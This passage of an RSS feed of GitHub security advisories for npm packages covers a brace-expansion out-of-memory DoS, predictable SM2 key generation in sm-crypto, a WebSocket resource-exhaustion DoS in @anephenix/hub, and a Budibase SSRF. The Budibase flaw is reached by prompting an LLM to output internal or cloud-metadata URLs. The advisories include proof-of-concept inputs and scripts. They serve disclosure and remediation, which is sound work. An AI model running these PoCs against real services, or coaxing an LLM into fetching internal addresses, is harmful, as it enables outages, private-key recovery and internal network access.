<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-07-24T21:53:59.496Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion: DoS via unbounded expansion length causing an out-of-memory process crash]]></title>
        <id>https://github.com/advisories/GHSA-mh99-v99m-4gvg</id>
        <link href="https://github.com/advisories/GHSA-mh99-v99m-4gvg"/>
        <updated>2026-07-24T21:53:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>expand()</code> bounds the <em>number</em> of results it produces (the <code>max</code> option,
<code>100_000</code> by default) but not their <em>length</em>. By chaining many brace groups,
an attacker keeps the result count under <code>max</code> while making every result grow
with the number of groups. Building <code>max</code> long results — plus the intermediate
arrays combined at each brace group — exhausts memory and crashes the Node
process with an <strong>uncatchable</strong> out-of-memory error. <code>try/catch</code> around
<code>expand()</code> does not help: the fatal error terminates the process.</p>
<p>A ~7.5 KB input (<code>'{a,b}'.repeat(1500)</code>) is enough to crash a default Node
process.</p>
<h3 id="details">Details</h3>
<p>For <code>N</code> chained brace groups such as <code>'{a,b}'.repeat(N)</code>:</p>
<ul>
<li>the result count is <code>2^N</code>, immediately capped at <code>max</code> (<code>100_000</code>), so the
<code>max</code> protection appears to hold, but</li>
<li>each result is <code>N</code> characters long, so the total output size is
<code>max × N</code> characters, which grows without bound in <code>N</code>.</li>
</ul>
<p><code>expand_</code> combines each brace set with the fully-expanded tail:</p>
<pre><code class="language-js">const post = m.post.length ? expand_(m.post, max, false) : ['']
...
for (let j = 0; j &lt; N.length; j++) {
  for (let k = 0; k &lt; post.length &amp;&amp; expansions.length &lt; max; k++) {
    const expansion = pre + N[j] + post[k]   // grows one group longer per level
    ...
    expansions.push(expansion)
  }
}
</code></pre>
<p>The loop guard <code>expansions.length &lt; max</code> limits how many strings are built, but
nothing limits how long they get. Each recursion level materializes another
array of up to <code>max</code> strings, one character longer than the level below, and —
because V8 represents <code>pre + N[j] + post[k]</code> as a cons-string (rope) that
references <code>post[k]</code> — those intermediate strings stay reachable through the
whole chain. Memory therefore scales with <code>max × N</code>.</p>
<p>Measured on <code>5.0.7</code> (<code>'{a,b}'.repeat(N)</code>, default <code>max</code>):</p>
<table>
<thead>
<tr>
<th>groups (N)</th>
<th>input bytes</th>
<th>result count</th>
<th>peak RSS</th>
</tr>
</thead>
<tbody><tr>
<td>20</td>
<td>100</td>
<td>100,000</td>
<td>~80 MB</td>
</tr>
<tr>
<td>50</td>
<td>250</td>
<td>100,000</td>
<td>~214 MB</td>
</tr>
<tr>
<td>100</td>
<td>500</td>
<td>100,000</td>
<td>~409 MB</td>
</tr>
<tr>
<td>300</td>
<td>1,500</td>
<td>100,000</td>
<td>~1,148 MB</td>
</tr>
<tr>
<td>1500</td>
<td>7,500</td>
<td>—</td>
<td><strong>OOM crash</strong></td>
</tr>
</tbody></table>
<h3 id="proof-of-concept">Proof of concept</h3>
<pre><code class="language-js">const { expand } = require('brace-expansion')

// ~7.5 KB input — crashes the process with a fatal, uncatchable OOM:
//   FATAL ERROR: ... JavaScript heap out of memory
try {
  expand('{a,b}'.repeat(1500))
} catch (e) {
  // never reached — the process is already dead
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any application that passes attacker-influenced strings to
<code>brace-expansion.expand()</code> — directly, or transitively via <code>minimatch</code> / <code>glob</code>
brace patterns — can be crashed by a small request. Because the failure is a
fatal V8 out-of-memory error rather than a thrown exception, it cannot be caught
and it takes down the whole worker/process, denying service.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to a patched release. The fix bounds the total number of characters a
single <code>expand()</code> call may accumulate (<code>EXPANSION_MAX_LENGTH</code>, default
<code>4_000_000</code>, configurable via a new <code>maxLength</code> option), applied inside the
output-building loops so intermediate arrays are bounded too. Once the limit is
reached, output is truncated — consistent with how <code>max</code> already truncates —
instead of growing without bound. The limit sits well above any realistic
expansion (100,000 results hitting <code>max</code> measure ~1M characters), so legitimate
input is unaffected.</p>
<p>After the fix, <code>'{a,b}'.repeat(1500)</code> returns a bounded, truncated result in
~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB
heap.</p>
<p>The fix bounds memory but the algorithm still rebuilds intermediate arrays at
each level (roughly <code>O(N × maxLength)</code> work on this input class). A streaming
rewrite that produces output in <code>O(total output size)</code> can be a non-urgent
follow-up.</p>
<p>If immediate upgrade isn't possible, avoid passing untrusted input to
<code>expand()</code> / glob brace patterns, or pass a small explicit <code>max</code> <strong>and</strong>
<code>maxLength</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-mh99-v99m-4gvg">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-mh99-v99m-4gvg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-14257">https://nvd.nist.gov/vuln/detail/CVE-2026-14257</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/a1bd33999ea75262c4749fff3bbb0d1372bd07b5">https://github.com/juliangruber/brace-expansion/commit/a1bd33999ea75262c4749fff3bbb0d1372bd07b5</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion">https://github.com/juliangruber/brace-expansion</a></li>
<li><a href="https://www.npmjs.com/package/brace-expansion">https://www.npmjs.com/package/brace-expansion</a></li>
<li><a href="https://github.com/advisories/GHSA-mh99-v99m-4gvg">https://github.com/advisories/GHSA-mh99-v99m-4gvg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh99-v99m-4gvg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:53:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sm-crypto] sm-crypto: Predictable SM2 key generation in Node.js: default RNG uses Math.random + wall clock]]></title>
        <id>https://github.com/advisories/GHSA-vh45-f885-3848</id>
        <link href="https://github.com/advisories/GHSA-vh45-f885-3848"/>
        <updated>2026-07-24T21:50:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>sm-crypto</code> (npm package <strong>0.4.0</strong>, the latest release, published 2026-01-20)
generates SM2 private keys and signing ephemeral scalars from a single
module-wide RNG instance (<code>src/sm2/utils.js</code>: <code>const rng = new SecureRandom()</code>).
<code>SecureRandom</code> is jsbn's PRNG, which seeds an <strong>ARC4</strong> stream from
<code>window.crypto.getRandomValues</code> when available. <strong>In Node.js — sm-crypto's
primary runtime — <code>window</code> is <code>undefined</code>, so the CSPRNG branch is skipped</strong>
and the seed pool is instead filled from <code>Math.random()</code> (V8 <code>xorshift128+</code>,
recoverable from a few outputs) plus <code>new Date().getTime()</code> (wall clock,
attacker-estimable).</p>
<p>Node <em>does</em> expose Web Crypto as <code>globalThis.crypto</code>, but jsbn checks
<code>window.crypto</code>, not <code>globalThis.crypto</code>, so the secure path is never taken.
Consequently every SM2 private key produced by the default
<code>sm2.generateKeyPairHex()</code> and every signing ephemeral scalar is derived from
non-cryptographic sources and is <strong>predictable</strong> by an attacker who can observe
a few <code>Math.random()</code> outputs and estimate the generation time.</p>
<p>This is the library's <strong>default</strong> (no-argument) path; no caller-selected
parameter or configuration is required to trigger it. It is reproduced
end-to-end against the unmodified real npm packages (<code>sm-crypto@0.4.0</code> +
<code>jsbn@1.1.0</code>); the PoC below runs against the real installed package, not a
copy. The defect is still present on the latest published version (0.4.0) and
is not covered by any existing <code>JuneAndGreen/sm-crypto</code> issue (0 afldl issues
exist; the most recent issues are unrelated SM3/HKDF/PBKDF2 feature requests).</p>
<h2 id="details">Details</h2>
<p><code>jsbn@1.1.0</code> <code>index.js</code> — RNG pool initialization (fallback taken in Node):</p>
<pre><code class="language-js">if (rng_pool == null) {
  rng_pool = new Array(); rng_pptr = 0; var t;
  if (typeof window !== "undefined" &amp;&amp; window.crypto) {     // &lt;-- false in Node
    if (window.crypto.getRandomValues) { /* webcrypto */ }
    ...
  }
  while (rng_pptr &lt; rng_psize) {                            // &lt;-- fallback path
    t = Math.floor(65536 * Math.random());                  //     Math.random()
    rng_pool[rng_pptr++] = t &gt;&gt;&gt; 8;
    rng_pool[rng_pptr++] = t &amp; 255;
  }
  rng_pptr = 0;
  rng_seed_time();                                           //     + Date.getTime()
}
</code></pre>
<p><code>sm-crypto</code> <code>src/sm2/utils.js</code>:</p>
<pre><code class="language-js">const { SecureRandom } = require('jsbn');
const rng = new SecureRandom();                              // single module-wide RNG
...
function generateKeyPairHex(a, b, c) {
  const random = a ? new BigInteger(a, b, c)
                   : new BigInteger(n.bitLength(), rng);     // uses rng
  const d = random.mod(n.subtract(BigInteger.ONE)).add(BigInteger.ONE); // private key
  ...
}
</code></pre>
<p>The default (no-argument) call path uses <code>rng</code>, the jsbn ARC4 instance seeded
from <code>Math.random()</code> + time. The same <code>rng</code> feeds the signing ephemeral
scalar during SM2 signing.</p>
<h2 id="poc">PoC</h2>
<p>The PoC runs against the real installed npm packages. It pins <code>Math.random</code>
and <code>Date</code> <strong>before</strong> <code>require('sm-crypto')</code> so jsbn's seed pool is built from
controlled inputs. Three independent fresh Node processes then produce the
<strong>same</strong> SM2 private key, proving the key is a pure deterministic function of
those non-cryptographic sources. It also prints a probe confirming the fallback
branch is taken in Node.</p>
<h3 id="one-line-reproducer">One-line reproducer</h3>
<pre><code class="language-bash">WORK=$(mktemp -d) &amp;&amp; cd "$WORK" &amp;&amp; npm init -y &gt;/dev/null \
  &amp;&amp; npm install sm-crypto@0.4.0 jsbn@1.1.0 &gt;/dev/null \
  &amp;&amp; export NODE_PATH="$WORK/node_modules" \
  &amp;&amp; node poc.js probe &amp;&amp; node poc.js deterministic &amp;&amp; node poc.js deterministic
</code></pre>
<h3 id="pocjs"><code>poc.js</code></h3>
<pre><code class="language-js">/*
 * PoC for sm-crypto predictable default RNG in Node.js.
 *
 * sm-crypto (npm 0.4.0) generates SM2 private keys / ephemeral scalars using
 * jsbn's SecureRandom. In a browser jsbn seeds ARC4 from window.crypto, but in
 * Node.js `window` is undefined so the CSPRNG branch is skipped and the pool is
 * filled from Math.random() plus new Date().getTime(). Both are
 * non-cryptographic; the time is attacker-estimable and V8's Math.random is a
 * recoverable xorshift128+ stream. Consequently SM2 keys produced by the
 * default path are predictable.
 *
 * This PoC proves the key is a deterministic function of those two inputs: we
 * pin Math.random and the clock to fixed values BEFORE sm-crypto (and therefore
 * jsbn) is loaded, then generate a keypair. Re-running with the same pinned
 * values reproduces the exact same private key.
 */

const MODE = process.argv[2] || 'probe'; // 'probe' | 'deterministic'

if (MODE === 'deterministic') {
  // --- pin entropy sources BEFORE requiring sm-crypto/jsbn ---
  const fixedTime = 1700000000000;
  let s = 0x12345678 &gt;&gt;&gt; 0;
  Math.random = function () {
    // tiny deterministic LCG standing in for the (already non-crypto) Math.random
    s = (Math.imul(s, 1103515245) + 12345) &gt;&gt;&gt; 0;
    return s / 0x100000000;
  };
  const RealDate = globalThis.Date;
  class FixedDate extends RealDate {
    constructor(...a) { super(...(a.length === 0 ? [fixedTime] : a)); }
  }
  FixedDate.now = () =&gt; fixedTime;
  globalThis.Date = FixedDate;
}

const sm2 = require('sm-crypto').sm2;
const kp = sm2.generateKeyPairHex();
console.log('PRIVATE=' + kp.privateKey);

if (MODE === 'probe') {
  console.log('--- probe ---');
  console.log('typeof window =', typeof window, '(undefined in Node =&gt; jsbn CSPRNG branch skipped)');
  console.log('typeof globalThis.crypto =', typeof globalThis.crypto, '(Node Web Crypto exists but jsbn checks window.crypto, not globalThis.crypto)');
  console.log('Math.random sample =', Math.random());
  console.log('Date.now() =', Date.now(), '(attacker-estimable, mixed into ARC4 seed)');
}
</code></pre>
<p>Real captured output:</p>
<pre><code>===== PROBE (real default path, no patching) =====
PRIVATE=6072e45733a4187791ec28ce906fef18c7d33c8529969e1a852833c4349cfc38
--- probe ---
typeof window = undefined (undefined in Node =&gt; jsbn CSPRNG branch skipped)
typeof globalThis.crypto = object (Node Web Crypto exists but jsbn checks window.crypto, not globalThis.crypto)
Math.random sample = 0.704452488761137
Date.now() = 1784455686795 (attacker-estimable, mixed into ARC4 seed)

===== DETERMINISTIC (Math.random + Date pinned before require sm-crypto) =====
--- run #1 ---  PRIVATE=143268fa0939b4da09eab8c9a2e027a04555b6c433fef4f54fc5edd517c0a6b1
--- run #2 ---  PRIVATE=143268fa0939b4da09eab8c9a2e027a04555b6c433fef4f54fc5edd517c0a6b1
</code></pre>
<p>The two deterministic runs produce the <strong>identical</strong> SM2 private key,
demonstrating the key is a pure function of <code>Math.random()</code> + wall-clock time.</p>
<h2 id="impact">Impact</h2>
<p><strong>Private-key recovery / signature forgery of any SM2 keypair generated with
the default API in Node.js.</strong> This is the most serious class of defect for a
maintained SM2 library: the <em>default</em> key-generation path is
non-cryptographic on its primary runtime.</p>
<ul>
<li><strong>Private-key recovery.</strong> Any SM2 keypair generated with the default API in
Node is derived from <code>Math.random()</code> + wall-clock time. An attacker who can
observe a few <code>Math.random()</code> outputs (V8 <code>xorshift128+</code> state is
recoverable from ~4 observed doubles) and estimate the generation time can
reproduce the private key and forge signatures.</li>
<li><strong>Signing ephemeral reuse / forgery.</strong> The same RNG feeds the ephemeral
scalar <code>k</code> during SM2 signing; a predictable <code>k</code> leaks the private key from a
single signature (SM2 is EC-Schnorr-like: <code>s = (k^-1)(e + d·r) mod n</code>).</li>
<li>Pre-authentication / no privilege required: anyone who can induce a victim
to generate a key or sign a message (the normal API use) is positioned to
predict the secret material.</li>
</ul>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Seed the RNG from a CSPRNG in Node. The simplest fix in <code>sm-crypto</code> is to
replace the jsbn ARC4 instance with Web Crypto / <code>crypto.randomBytes</code>:</p>
<pre><code class="language-js">// src/sm2/utils.js
const nodeCrypto = (typeof require === 'function') ? require('crypto') : null;
function csrandBytes(n) {
  if (nodeCrypto) return nodeCrypto.randomBytes(n);          // Node
  if (globalThis.crypto) {                                   // Web Crypto (browser/Node ≥ 19)
    const b = new Uint8Array(n); globalThis.crypto.getRandomValues(b); return b;
  }
  throw new Error('no CSPRNG available');
}
</code></pre>
<p>and use it to generate the private key / ephemeral directly, or to reseed the
jsbn pool. A separate (upstream) fix belongs in jsbn to check
<code>globalThis.crypto</code> in addition to <code>window.crypto</code>.</p>
<h3 id="affected-versions">Affected versions</h3>
<ul>
<li>npm <code>sm-crypto</code> <strong>0.4.0</strong> (latest, published 2026-01-20). Depends on
<code>jsbn ^1.1.0</code> (<code>jsbn@1.1.0</code>, whose <code>index.js</code> RNG is the root cause).</li>
<li>Runtime: Node.js (the primary runtime; in a browser the jsbn CSPRNG branch
is taken).</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Reported by the diff/ambidiff security research effort (afldl).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/JuneAndGreen/sm-crypto/security/advisories/GHSA-vh45-f885-3848">https://github.com/JuneAndGreen/sm-crypto/security/advisories/GHSA-vh45-f885-3848</a></li>
<li><a href="https://github.com/JuneAndGreen/sm-crypto/commit/1f9bd7bd160c24efd9c26c8f7fda997c68c823d0">https://github.com/JuneAndGreen/sm-crypto/commit/1f9bd7bd160c24efd9c26c8f7fda997c68c823d0</a></li>
<li><a href="https://github.com/advisories/GHSA-vh45-f885-3848">https://github.com/advisories/GHSA-vh45-f885-3848</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vh45-f885-3848</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-24T21:50:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@anephenix/hub] @anephenix/hub: Unauthenticated WebSocket RPC Waiter Resource Exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-g5vv-q72c-7j78</id>
        <link href="https://github.com/advisories/GHSA-g5vv-q72c-7j78"/>
        <updated>2026-07-24T21:47:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@anephenix/hub</code> starts a <code>setInterval</code> polling loop for every incoming WebSocket connection to request a client ID via RPC. If the remote client never replies — which requires no authentication or special configuration — the interval and the pending request object are never cleaned up, even after the socket is closed. An unauthenticated attacker who opens many WebSocket connections and ignores all server RPC messages will therefore cause the server to accumulate unbounded timers and heap entries, leading to CPU and memory exhaustion (DoS).</p>
<h3 id="details">Details</h3>
<p>When a client connects, <code>loadDefaultConnectionEventListeners</code> (registered in <code>src/lib/index.ts:128</code>) adds a connection listener that calls <code>requestClientId({ ws, rpc })</code> for every new WebSocket (<code>src/lib/index.ts:262</code>). <code>requestClientId</code> issues an RPC send for the <code>get-client-id</code> action (<code>src/lib/clientId.ts:112</code>), which internally calls <code>rpc.send</code>.</p>
<p>Inside <code>rpc.send</code>, the payload is pushed onto <code>this.requests</code> (<code>src/lib/rpc.ts:282</code>) and <code>waitForReply</code> is invoked. <code>waitForReply</code> starts a <code>setInterval</code> that polls <code>responses[]</code> every 10 ms for a matching reply (<code>src/lib/rpc.ts:250</code>):</p>
<pre><code class="language-ts">// src/lib/rpc.ts:250–267
interval = setInterval(() =&gt; {
    const response = responses.find(
        (r) =&gt; r.id === id &amp;&amp; r.action === action,
    );
    if (response) {
        if (interval) clearInterval(interval);
        // ... resolve and cleanup
        this.cleanupRPCCall(response);
    }
}, 10);
</code></pre>
<p><code>clearInterval</code> is only called when a matching response arrives. There is no timeout path and no socket-close handler that clears either the interval or the <code>this.requests</code> entry. The <code>close</code> handler registered in <code>loadDefaultConnectionEventListeners</code> (<code>src/lib/index.ts:128–134</code>) only calls <code>pubsub.unsubscribeClientFromAllChannels</code>; it does not cancel pending RPC requests for that socket.</p>
<p><strong>Data flow (source → sink):</strong></p>
<ol>
<li><code>src/lib/index.ts:269</code> — <code>wss.on("connection")</code> accepts any remote WebSocket (no authentication).</li>
<li><code>src/lib/index.ts:272</code> — connection listeners are iterated and invoked.</li>
<li><code>src/lib/index.ts:262</code> — <code>requestClientId({ ws, rpc: this.rpc })</code> is called for every connection by default.</li>
<li><code>src/lib/clientId.ts:112</code> — <code>rpc.send({ ws, action: 'get-client-id' })</code> creates an RPC request.</li>
<li><code>src/lib/rpc.ts:282</code> — <code>this.requests.push(payload)</code> registers the pending request.</li>
<li><code>src/lib/rpc.ts:250</code> — <code>setInterval(..., 10)</code> begins infinite polling; cleanup only happens on a matching response. Socket close does not trigger cleanup.</li>
</ol>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites:</strong> Docker must be available on the host.</p>
<p><strong>Step 1 — Build the verification image:</strong></p>
<pre><code class="language-bash">docker build --no-cache \
  -f vuln-001/Dockerfile \
  -t hub-vuln-001:latest \
  reports/npm_web_272_anephenix__hub
</code></pre>
<p><strong>Step 2 — Run the container:</strong></p>
<pre><code class="language-bash">docker run --rm --network none hub-vuln-001:latest
</code></pre>
<p>The container runs <code>verify.mjs</code>, which:</p>
<ol>
<li>Starts a <code>Hub</code> server on a local port.</li>
<li>Opens a WebSocket and waits for the server's <code>get-client-id</code> RPC message without replying.</li>
<li>Closes the socket and waits 300 ms.</li>
<li>Inspects <code>hub.rpc.requests.length</code> — it must remain <code>1</code> even though <code>hub.wss.clients.size</code> is <code>0</code>.</li>
<li>Opens five more sockets the same way (batch), then verifies that <code>pendingRpcRequests</code> equals <code>6</code>.</li>
</ol>
<p><strong>Step 3 — Alternatively, run the Python orchestrator directly:</strong></p>
<pre><code class="language-bash">python3 vuln-001/poc.py
</code></pre>
<p><strong>Expected output (confirmed):</strong></p>
<pre><code class="language-json">{
  "snapshotAfterClose":  {"clientState": 3, "serverClients": 0, "pendingRpcRequests": 1},
  "snapshotAfterBatch":  {"serverClients": 0, "pendingRpcRequests": 6, "expectedPendingRpcRequests": 6}
}
</code></pre>
<p><code>pendingRpcRequests</code> grows linearly with the number of unanswered connections and never decreases, confirming the unbounded resource leak.</p>
<p><strong>Minimal inline reproduction</strong> (without Docker, inside the repository after <code>npm ci &amp;&amp; npm run build</code>):</p>
<pre><code class="language-bash">node --input-type=module - &lt;&lt;'EOF'
import Hub from './dist/esm/index.js';
import { WebSocket } from 'ws';

const port = 8766;
const hub = new Hub({ port });
hub.listen();
const ws = new WebSocket(`ws://localhost:${port}`);

await new Promise((resolve) =&gt; ws.once('message', resolve));
ws.close();
await new Promise((resolve) =&gt; setTimeout(resolve, 300));
console.log(JSON.stringify({
  serverClients:      hub.wss.clients.size,
  pendingRpcRequests: hub.rpc.requests.length,
}));
hub.server.close();
process.exit(0);
EOF
</code></pre>
<p>Expected:</p>
<pre><code class="language-json">{"serverClients": 0, "pendingRpcRequests": 1}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an <strong>unauthenticated Denial-of-Service</strong> vulnerability. Any network-reachable <code>@anephenix/hub</code> server running with default configuration is affected. An attacker who opens a large number of WebSocket connections and never replies to the server's <code>get-client-id</code> RPC causes the server process to accumulate one <code>setInterval</code> timer (polling every 10 ms) and one heap object per connection indefinitely. With enough connections this exhausts CPU scheduling time and memory, making the server unavailable to legitimate clients.</p>
<p>No authentication, special headers, or knowledge of internal protocol details are required — a plain WebSocket <code>connect</code> followed by silence is sufficient.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile">FROM node:20-alpine

RUN apk add --no-cache python3 make g++

WORKDIR /app

# Install dependencies first for layer caching
COPY repo/package.json repo/package-lock.json ./
RUN npm ci --ignore-scripts

# Copy the rest of the source and build
COPY repo/ ./
RUN npm run build

# Copy the vulnerability verification script into /app so node_modules is resolvable
COPY vuln-001/verify.mjs /app/verify.mjs

CMD ["node", "/app/verify.mjs"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
VULN-001 PoC — Unauthenticated WebSocket RPC Waiter Resource Exhaustion
(@anephenix/hub v0.2.15)

Builds a Docker image containing the hub library and a verification script,
then runs the container to produce deterministic evidence that
hub.rpc.requests[] entries (and their backing setInterval timers) are never
cleaned up when a WebSocket client disconnects without replying to the
server's "get-client-id" RPC request.

Usage:
    python3 poc.py

Exit codes:
    0  — vulnerability confirmed (PASS)
    1  — not reproduced (FAIL)
    2  — environment / build error
"""

import json
import subprocess
import sys
from pathlib import Path

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
SCRIPT_DIR = Path(__file__).resolve().parent
REPO_ROOT   = SCRIPT_DIR.parent              # …/npm_web_272_anephenix__hub/
DOCKERFILE  = SCRIPT_DIR / "Dockerfile"
POC_TAG     = "hub-vuln-001:latest"

BUILD_CMD = [
    "docker", "build",
    "--no-cache",
    "-f", str(DOCKERFILE),
    "-t", POC_TAG,
    str(REPO_ROOT),   # build context = parent dir so COPY repo/ and COPY vuln-001/ both resolve
]

RUN_CMD = [
    "docker", "run",
    "--rm",
    "--network", "none",  # no external network access needed
    POC_TAG,
]


def banner(msg: str) -&gt; None:
    print(f"\n{'='*60}\n  {msg}\n{'='*60}")


def run(cmd: list[str], **kwargs) -&gt; subprocess.CompletedProcess:
    print("$", " ".join(cmd))
    return subprocess.run(cmd, **kwargs)


def build_image() -&gt; None:
    banner("Phase 1 — Building Docker image")
    result = run(BUILD_CMD, capture_output=False)
    if result.returncode != 0:
        print("[ERROR] Docker build failed.", file=sys.stderr)
        sys.exit(2)
    print("[OK] Image built:", POC_TAG)


def run_poc() -&gt; dict:
    banner("Phase 2 — Running vulnerability verification inside container")
    result = run(RUN_CMD, capture_output=True, text=True)

    print("--- container stdout ---")
    print(result.stdout)
    if result.stderr:
        print("--- container stderr ---")
        print(result.stderr)

    # The container exits 0 on confirmed leak, 1 otherwise.
    if result.returncode == 2:
        print("[ERROR] Verification script crashed.", file=sys.stderr)
        sys.exit(2)

    try:
        data = json.loads(result.stdout)
    except json.JSONDecodeError as exc:
        print(f"[ERROR] Could not parse container output as JSON: {exc}", file=sys.stderr)
        sys.exit(2)

    return data, result.returncode


def evaluate(data: dict, container_exit: int) -&gt; tuple[bool, str]:
    """Return (passed, evidence_summary)."""
    after_close = data.get("snapshotAfterClose", {})
    after_batch  = data.get("snapshotAfterBatch", {})

    leaked_single = (
        after_close.get("pendingRpcRequests", 0) &gt; 0 and
        after_close.get("serverClients", -1) == 0 and
        after_close.get("clientState", -1) == 3          # WebSocket.CLOSED
    )

    leaked_batch = (
        after_batch.get("pendingRpcRequests", 0) ==
        after_batch.get("expectedPendingRpcRequests", -1)
    )

    passed = leaked_single and leaked_batch and container_exit == 0

    evidence = (
        f"snapshotAfterClose={json.dumps(after_close)}; "
        f"snapshotAfterBatch={json.dumps(after_batch)}; "
        f"container_exit={container_exit}"
    )
    return passed, evidence


def main() -&gt; None:
    build_image()
    data, container_exit = run_poc()

    banner("Phase 3 — Evaluating results")
    passed, evidence = evaluate(data, container_exit)

    if passed:
        print("[PASS] Leak confirmed: RPC waiter entries persist after socket close.")
    else:
        print("[FAIL] Leak NOT observed — check container output above.")

    return passed, evidence, data


if __name__ == "__main__":
    passed, evidence, raw = main()

    verdict = "PASS" if passed else "FAIL"
    reason = (
        "소켓이 닫힌 뒤에도 hub.rpc.requests[] 항목과 setInterval 타이머가 해제되지 않음이 "
        "런타임 검사로 확인됨. 단일 연결에서 pendingRpcRequests=1이 유지되고, "
        "배치 5개 추가 후 총 6개가 누적되어 선형 리소스 누수가 증명됨."
        if passed else
        "컨테이너 실행 결과에서 결정적 증거를 확보하지 못했음."
    )

    result_path = SCRIPT_DIR / "phase2_result.json"
    phase2 = {
        "passed": passed,
        "verdict": verdict,
        "reason": reason,
        "build_command": " ".join(BUILD_CMD),
        "run_command": " ".join(RUN_CMD),
        "poc_command": f"python3 {Path(__file__).name}",
        "evidence": evidence,
        "artifacts": ["Dockerfile", "verify.mjs", "poc.py"],
    }

    result_path.write_text(json.dumps(phase2, indent=2, ensure_ascii=False))
    print(f"\n[INFO] Results written to {result_path}")

    sys.exit(0 if passed else 1)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/anephenix/hub/security/advisories/GHSA-g5vv-q72c-7j78">https://github.com/anephenix/hub/security/advisories/GHSA-g5vv-q72c-7j78</a></li>
<li><a href="https://github.com/anephenix/hub/commit/67260d2a1407a77f082f02dc9e1f0891222c306d">https://github.com/anephenix/hub/commit/67260d2a1407a77f082f02dc9e1f0891222c306d</a></li>
<li><a href="https://github.com/anephenix/hub/commit/931576db3cdbf4f1583bd2c3c8759c4f4e032ab3">https://github.com/anephenix/hub/commit/931576db3cdbf4f1583bd2c3c8759c4f4e032ab3</a></li>
<li><a href="https://github.com/advisories/GHSA-g5vv-q72c-7j78">https://github.com/advisories/GHSA-g5vv-q72c-7j78</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g5vv-q72c-7j78</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:47:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server] Budibase: SSRF via bare fetch() in uploadUrl during AI table generation]]></title>
        <id>https://github.com/advisories/GHSA-hfhx-w8p8-4hc7</id>
        <link href="https://github.com/advisories/GHSA-hfhx-w8p8-4hc7"/>
        <updated>2026-07-24T21:47:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="budibase-ssrf-via-bare-fetch-in-uploadurl-during-ai-table-generation">Budibase: SSRF via bare fetch() in uploadUrl during AI table generation</h1>
<h2 id="summary">Summary</h2>
<p>The <code>uploadUrl()</code> function in <code>packages/server/src/utilities/fileUtils.ts</code> uses a bare <code>fetch(url)</code> call without any SSRF protection. This function is invoked when the AI table generation feature processes LLM-generated attachment column values that are strings (URLs).</p>
<p>A builder-level user can craft prompts that cause the LLM to generate internal IP addresses or cloud metadata endpoints as attachment URLs. When <code>generateRows()</code> calls <code>processAttachments()</code>, these URLs are fetched server-side without blacklist validation, allowing the attacker to reach internal services, cloud metadata APIs (169.254.169.254), or other network-internal resources.</p>
<p>This is a variant of the same class of issue addressed in other Budibase code paths where <code>fetchWithBlacklist()</code> is correctly used to prevent SSRF.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p>&lt;= 3.39.0 (current <code>lerna.json</code> version at time of analysis)</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<h3 id="root-cause-uploadurl-uses-bare-fetch-without-ssrf-blacklist-check">Root Cause: uploadUrl() uses bare fetch() without SSRF blacklist check</h3>
<pre><code class="language-typescript">// packages/server/src/utilities/fileUtils.ts:21-23
export async function uploadUrl(url: string): Promise&lt;Upload | undefined&gt; {
  try {
    const res = await fetch(url)  // No blacklist validation
</code></pre>
<p>This is called from:</p>
<pre><code class="language-typescript">// packages/server/src/sdk/workspace/ai/helpers/rows.ts:104-114
async function processAttachments(
  entry: Record&lt;string, any&gt;,
  attachmentColumns: FieldSchema[]
) {
  function processAttachment(value: any) {
    if (typeof value === "object") {
      return uploadFile(value)
    }

    return uploadUrl(value)  // String values treated as URLs, fetched without protection
  }
</code></pre>
<p>Which is triggered via <code>generateRows()</code> at line 34:</p>
